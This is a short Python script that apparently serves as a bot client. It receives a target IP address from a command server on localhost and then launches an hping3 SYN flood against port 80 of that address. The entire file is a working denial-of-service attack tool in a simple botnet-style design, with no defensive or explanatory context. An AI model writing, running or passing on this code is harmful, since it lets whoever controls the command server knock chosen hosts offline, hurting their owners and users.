import socket
import subprocess

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 5000)
    client_socket.connect(server_address)
    ip_address = client_socket.recv(1024).decode()
    print(f"Received IP address from server: {ip_address}")
    
    client_socket.close()
    try:
        subprocess.run(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', '80', '--flood', ip_address], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running hping3: {e}")

if __name__ == "__main__":
    main()
